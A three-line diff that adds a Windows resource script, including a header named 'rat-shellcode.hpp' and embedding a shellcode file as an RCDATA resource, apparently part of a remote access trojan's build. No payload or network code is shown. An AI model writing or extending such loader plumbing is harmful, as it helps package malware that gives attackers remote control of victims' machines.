@@ -1,0 +1,3 @@
+#include "rat-shellcode.hpp"
+
+SHELLCODE RCDATA SHELLCODE_PATH
